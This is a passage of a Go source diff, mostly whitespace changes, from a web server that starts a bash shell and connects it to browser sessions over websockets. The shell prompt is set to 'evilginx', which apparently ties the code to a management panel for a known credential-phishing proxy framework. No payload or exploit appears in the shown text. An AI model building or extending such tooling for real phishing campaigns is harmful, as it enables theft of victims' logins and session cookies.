 	// Start terminal I/O
 	go ws.handleTerminalOutput(session)
 	go ws.handleTerminalInput(session)
-	
+
 	// Session cleanup
 	defer ws.cleanupTerminalSession(sessionID)
-	
+
 	// Keep session alive
 	for {
 		if !session.IsActive {
@@ -4886,28 +5322,28 @@ func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*Termin
 		"SHELL=/bin/bash",
 		"PS1=\\[\\033[1;32m\\]evilginx\\[\\033[0m\\]@\\[\\033[1;34m\\]terminal\\[\\033[0m\\]:\\[\\033[1;31m\\]\\w\\[\\033[0m\\]$ ",
 	}
-	
+
 	// For systems with pty support, we'd use pty.Start(cmd) here
 	// For now, we'll use basic pipes
 	stdin, err := cmd.StdinPipe()
 	if err != nil {
 		return nil, err
 	}
-	
+
 	stdout, err := cmd.StdoutPipe()
 	if err != nil {
 		return nil, err
 	}
-	
+
 	stderr, err := cmd.StderrPipe()
 	if err != nil {
 		return nil, err
 	}
-	
+
 	if err := cmd.Start(); err != nil {
 		return nil, err
 	}
-	
+
 	session := &TerminalSession{
 		ID:           sessionID,
 		CMD:          cmd,
@@ -4917,11 +5353,11 @@ func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*Termin
 		UserID:       userToken,
 		IsActive:     true,
 	}
-	
+
 	ws.terminalMutex.Lock()
 	ws.terminalSessions[sessionID] = session
 	ws.terminalMutex.Unlock()
-	
+
 	// Handle stdout and stderr
 	go func() {
 		buf := make([]byte, 1024)
@@ -4942,7 +5378,7 @@ func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*Termin
 			}
 		}
 	}()
-	
+
 	go func() {
 		buf := make([]byte, 1024)
 		for {
@@ -4962,7 +5398,7 @@ func (ws *WebServer) createTerminalSession(sessionID, userToken string) (*Termin
 			}
 		}
 	}()
-	
+
 	return session, nil
 }
 
@@ -4973,20 +5409,20 @@ func (ws *WebServer) handleTerminalOutput(session *TerminalSession) {
 
 func (ws *WebServer) handleTerminalInput(session *TerminalSession) {
 	defer session.Conn.Close()
-	
+
 	var commandBuffer strings.Builder
-	
+
 	for {
 		_, message, err := session.Conn.ReadMessage()
 		if err != nil {
 			log.Debug("terminal websocket read error: %v", err)
 			break
 		}
-		
+
 		session.mutex.Lock()
 		session.LastActivity = time.Now()
 		session.mutex.Unlock()
-		
+
 		// Process input character by character
 		for _, char := range string(message) {
 			switch char {
@@ -5011,7 +5447,7 @@ func (ws *WebServer) handleTerminalInput(session *TerminalSession) {
 				commandBuffer.WriteRune(char)
 			}
 		}
-		
+
 		// Forward input to terminal (in a full implementation)
 		// For now, we'll just echo back
 		session.Conn.WriteMessage(1, message)
@@ -5021,22 +5457,22 @@ func (ws *WebServer) handleTerminalInput(session *TerminalSession) {
 func (ws *WebServer) cleanupTerminalSession(sessionID string) {
 	ws.terminalMutex.Lock()
 	defer ws.terminalMutex.Unlock()
-	
+
 	session, exists := ws.terminalSessions[sessionID]
 	if !exists {
 		return
 	}
-	
+
 	session.IsActive = false
-	
+
 	if session.CMD != nil && session.CMD.Process != nil {
 		session.CMD.Process.Kill()
 	}
-	
+
 	if session.Conn != nil {
 		session.Conn.Close()
 	}
-	
+
 	delete(ws.terminalSessions, sessionID)
 	log.Info("terminal session cleaned up: %s", sessionID)
 }
